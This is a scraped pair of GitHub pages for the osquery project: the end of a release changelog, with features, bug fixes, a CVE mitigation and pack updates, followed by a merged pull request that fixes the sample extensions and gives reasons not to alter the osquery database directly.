* Add Yandex Browser support for chrome\_extensions ([#6735](https://github.com/osquery/osquery/pull/6735))
* Add additional file stat flags to Darwin (bsd\_flags) ([#6699](https://github.com/osquery/osquery/pull/6699))
* Add extended\_attributes table to Linux, add support for Linux capabilities ([#6195](https://github.com/osquery/osquery/pull/6195))
* Add indexed column support to Windows users table ([#6782](https://github.com/osquery/osquery/pull/6782))
* Enable AWS Instance profile as credential provider on Windows ([#6754](https://github.com/osquery/osquery/pull/6754))
* Add systemd support for startup\_items on Linux ([#6562](https://github.com/osquery/osquery/pull/6562))

### Bug Fixes

* Do not use memset on VirtualTable, a non-POD type ([#6760](https://github.com/osquery/osquery/pull/6760))
* Fix deadlock when registering two extensions ([#6745](https://github.com/osquery/osquery/pull/6745))
* Fix last\_connected column in wifi\_networks on Catalina ([#6669](https://github.com/osquery/osquery/pull/6669))
* Fix missing negations, duplicate rows in iptables table ([#6713](https://github.com/osquery/osquery/pull/6713))
* Fix shadow table to detect empty passwords ([#6696](https://github.com/osquery/osquery/pull/6696))
* Free memory allocated by ConvertStringSidToSid ([#6714](https://github.com/osquery/osquery/pull/6714))
* PackageIdentifiers are optional in InstallHistory.plist ([#6767](https://github.com/osquery/osquery/pull/6767))
* Removing PUNYCODE flag from windows string conversions ([#6730](https://github.com/osquery/osquery/pull/6730))
* Fix memory leak in the dbus classes ([#6773](https://github.com/osquery/osquery/pull/6773))
* Change the kernel\_modules size column type to BIGINT ([#6712](https://github.com/osquery/osquery/pull/6712))

### Documentation

* Add a README.md to source-based libraries ([#6686](https://github.com/osquery/osquery/pull/6686))
* Fix spelling typos ([#6705](https://github.com/osquery/osquery/pull/6705))
* Journald Audit Logs Masking Documentation ([#6748](https://github.com/osquery/osquery/pull/6748))

### Build

* CI: Provide built packages as Azure artifacts ([#6772](https://github.com/osquery/osquery/pull/6772))
* CI: Python installation improvements on Windows ([#6764](https://github.com/osquery/osquery/pull/6764))
* CI: Update brew scripts ([#6794](https://github.com/osquery/osquery/pull/6794))
* CMake: Disable BPF support if the LLVM libs are not compatible ([#6746](https://github.com/osquery/osquery/pull/6746))
* CMake: Use CPACK\_RPM\_PACKAGE\_RELEASE ([#6805](https://github.com/osquery/osquery/pull/6805))
* CMake: Add max version limit to 3.18.0 on Linux ([#6801](https://github.com/osquery/osquery/pull/6801))
* Change urls for submodules gpg-error, libgcrypt, libcap ([#6768](https://github.com/osquery/osquery/pull/6768))
* Reduce linkage requirements for tests ([#6715](https://github.com/osquery/osquery/pull/6715))
* Remove a Buck leftover ([#6799](https://github.com/osquery/osquery/pull/6799))
* Remove boost workaround introduced in [#5591](https://github.com/osquery/osquery/issues/5591) for string\_view ([#6771](https://github.com/osquery/osquery/pull/6771))
* Tests: Fix tests on Catalina ([#6704](https://github.com/osquery/osquery/pull/6704))
* Update cmake\_minum\_required to 3.17.5 and pin version in CI ([#6770](https://github.com/osquery/osquery/pull/6770))
* build: Fix Windows build on newer MSVC ([#6732](https://github.com/osquery/osquery/pull/6732))
* extensions: Always compile examples to prevent them from breaking ([#6747](https://github.com/osquery/osquery/pull/6747))

### Security Issues

* Add SQLite authorizer to mitgate CVE-2020-26273 / [GHSA-4g56-2482-x7q8](https://github.com/osquery/osquery/security/advisories/GHSA-4g56-2482-x7q8 "GHSA-4g56-2482-x7q8") ([c3f9a3d](https://github.com/osquery/osquery/commit/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c))

### Packs

* Updated unwanted-chrome-extensions ([#6720](https://github.com/osquery/osquery/pull/6720))
* Restrict the usb\_devices pack to Posix ([#6739](https://github.com/osquery/osquery/pull/6739))
* Add Reptile rootkit to ossec-rootkit pack ([#6703](https://github.com/osquery/osquery/pull/6703))

 Assets
6

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f1dbd8eb_20250119_141357.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fpull%2F6747)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fpull%2F6747)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=osquery%2Fosquery)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[osquery](/osquery)
/
**[osquery](/osquery/osquery)**
Public

* [Notifications](/login?return_to=%2Fosquery%2Fosquery) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fosquery%2Fosquery)
* [Star
   22.2k](/login?return_to=%2Fosquery%2Fosquery)

* [Code](/osquery/osquery)
* [Issues
  586](/osquery/osquery/issues)
* [Pull requests
  35](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects
  0](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

Additional navigation options

* [Code](/osquery/osquery)
* [Issues](/osquery/osquery/issues)
* [Pull requests](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fosquery%2Fosquery%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fosquery%2Fosquery%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# extensions: Always compile examples to prevent them from breaking #6747

 Merged

[theopolis](/theopolis)
merged 1 commit into
[osquery:master](/osquery/osquery/tree/master "osquery/osquery:master")
from
[trailofbits:alessandro/bugfix/update-sample-extensions](/trailofbits/osquery/tree/alessandro/bugfix/update-sample-extensions "trailofbits/osquery:alessandro/bugfix/update-sample-extensions")

Nov 11, 2020

 Merged

# [extensions: Always compile examples to prevent them from breaking](#top) #6747

[theopolis](/theopolis)
merged 1 commit into
[osquery:master](/osquery/osquery/tree/master "osquery/osquery:master")
from
[trailofbits:alessandro/bugfix/update-sample-extensions](/trailofbits/osquery/tree/alessandro/bugfix/update-sample-extensions "trailofbits/osquery:alessandro/bugfix/update-sample-extensions")

Nov 11, 2020

[Conversation
1](/osquery/osquery/pull/6747)
[Commits
1](/osquery/osquery/pull/6747/commits)
[Checks
0](/osquery/osquery/pull/6747/checks)
[Files changed](/osquery/osquery/pull/6747/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![alessandrogario](https://avatars.githubusercontent.com/u/5714290?s=60&v=4)](/alessandrogario)

Copy link

Member

### @alessandrogario **[alessandrogario](/alessandrogario)** commented [Nov 5, 2020](#issue-736846632)

This PR updates the sample extensions to make them build correctly again.

Additional changes:

1. `extension_group_example`: removed since it didn't really contain an extension group
2. `ComplexExampleTable`: removed, since it encouraged developers to alter the osquery database

There are some key reasons not to change the osquery database directly

1. Performance: some tables (like powershell\_events) used to store state data at each new event. This caused performance issues.
2. There is currently no way to run cleanup logic when an extension is uninstalled (unloaded and deleted).
3. Extensions should implement versioning on their own data fields, in order to gracefully handle changes in the format. There is however nothing implemented in osquery yet that forces developer to correctly handle this case.
4. Writes should happen within transactions, which are not currently supported.

Sorry, something went wrong.

All reactions

[![@alessandrogario](https://avatars.githubusercontent.com/u/5714290?s=40&u=234ef2c73ebaec4fa8db5a66d51d2a2838f61b36&v=4)](/alessandrogario)
[alessandrogario](/alessandrogario)
added
[extensions](/osquery/osquery/labels/extensions)
Related to osquery extension SDK or to extensions themselves
[SDK](/osquery/osquery/labels/SDK)
extensions / plugins SDK related things
[ready for review](/osquery/osquery/labels/ready%20for%20review)
Pull requests that are ready to be reviewed by a maintainer
labels
[Nov 5, 2020](#event-3961880504)

 [![@alessandrogario](https://avatars.githubusercontent.com/u/5714290?s=40&u=234ef2c73ebaec4fa8db5a66d51d2a2838f61b36&v=4)](/alessandrogario)
[alessandrogario](/alessandrogario)
[force-pushed](/osquery/osquery/compare/b403e55d23dd38e987f6fc9ad23de54fa7c8a1dc..db1fcdc4c37af211373b54e1831da02361ded660)
the
alessandro/bugfix/update-sample-extensions

branch
from
[`b403e55`](/osquery/osquery/commit/b403e55d23dd38e987f6fc9ad23de54fa7c8a1dc) to
[`db1fcdc`](/osquery/osquery/commit/db1fcdc4c37af211373b54e1831da02361ded660)  [Compare](/osquery/osquery/compare/b403e55d23dd38e987f6fc9ad23de54fa7c8a1dc..db1fcdc4c37af211373b54e1831da02361ded660)
[November 5, 2020 11:21](#event-3961885431)

[![@alessandrogario](https://avatars.githubusercontent.com/u/5714290?s=40&v=4)](/alessandrogario)

`[extensions: Always compile examples to prevent them from breaking](/osquery/osquery/pull/6747/commits/4fe882aeb4530051f6d197d31c98d19195ff5ee5 "extensions: Always compile examples to prevent them from breaking")`

`[4fe882a](/osquery/osquery/pull/6747/commits/4fe882aeb4530051f6d197d31c98d19195ff5ee5)`

 [![@alessandrogario](https://avatars.githubusercontent.com/u/5714290?s=40&u=234ef2c73ebaec4fa8db5a66d51d2a2838f61b36&v=4)](/alessandrogario)
[alessandrogario](/alessandrogario)
[force-pushed](/osquery/osquery/compare/db1fcdc4c37af211373b54e1831da02361ded660..4fe882aeb4530051f6d197d31c98d19195ff5ee5)
the
alessandro/bugfix/update-sample-extensions

branch
from
[`db1fcdc`](/osquery/osquery/commit/db1fcdc4c37af211373b54e1831da02361ded660) to
[`4fe882a`](/osquery/osquery/commit/4fe882aeb4530051f6d197d31c98d19195ff5ee5)  [Compare](/osquery/osquery/compare/db1fcdc4c37af211373b54e1831da02361ded660..4fe882aeb4530051f6d197d31c98d19195ff5ee5)
[November 5, 2020 11:31](#event-3961923818)

[![theopolis](https://avatars.githubusercontent.com/u/981645?s=60&v=4)](/theopolis)

**[theopolis](/theopolis)**
reviewed
[Nov 11, 2020](#pullrequestreview-527781346)

 [View reviewed changes](/osquery/osquery/pull/6747/files/4fe882aeb4530051f6d197d31c98d19195ff5ee5)

[external/examples/writable\_table/main.cpp](/osquery/osquery/pull/6747/files/4fe882aeb4530051f6d197d31c98d19195ff5ee5#diff-c9c0305c67b8c7dd2fcf195e7e8292c510378f5a71917c2c1a410cc8484c2a0a)

|  |  | @@ -294,6 +305,6 @@ int main(int argc, char\* argv[]) { | |
| --- | --- | --- | --- |
|  |  | } |
|  |  |  |
|  |  | // Finally wait for a signal / interrupt to shutdown. |
|  |  | runner.waitThenShutdown(); |
|  |  | runner.waitForShutdown(); |

Copy link

Member

### @theopolis **[theopolis](/theopolis)** [Nov 11, 2020](#discussion_r520999223)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Ah yes, this was specifically renamed to communicate a difference of expectation.

Sorry, something went wrong.

All reactions

[![theopolis](https://avatars.githubusercontent.com/u/981645?s=60&v=4)](/theopolis)

**[theopolis](/theopolis)**
approved these changes
[Nov 11, 2020](#pullrequestreview-527781681)

 [View reviewed changes](/osquery/osquery/pull/6747/files/4fe882aeb4530051f6d197d31c98d19195ff5ee5)

[![@theopolis](https://avatars.githubusercontent.com/u/981645?s=40&u=64c10116e2425e59183f9ef4f4c12ee9093699b4&v=4)](/theopolis)
[theopolis](/theopolis)
merged commit [`ffa3da4`](/osquery/osquery/commit/ffa3da4941541840f758b286a4d21cdd4b39371d)
into
osquery:master

[Nov 11, 2020](https://github.com/osquery/osquery/pull/6747#event-3981684748)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fpull%2F6747)

Reviewers

[![@theopolis](https://avatars.githubusercontent.com/u/981645?s=40&v=4)](/theopolis) [theopolis](/theopolis)

theopolis approved these changes

Assignees

No one assigned

Labels

[extensions](/osquery/osquery/labels/extensions)
Related to osquery extension SDK or to extensions themselves
[ready for review](/osquery/osquery/labels/ready%20for%20review)
Pull requests that are ready to be reviewed by a maintainer
[SDK](/osquery/osquery/labels/SDK)
extensions / plugins SDK related things

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@alessandrogario](https://avatars.githubusercontent.com/u/5714290?s=52&v=4)](/alessandrogario) [![@theopolis](https://avatars.githubusercontent.com/u/981645?s=52&v=4)](/theopolis)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


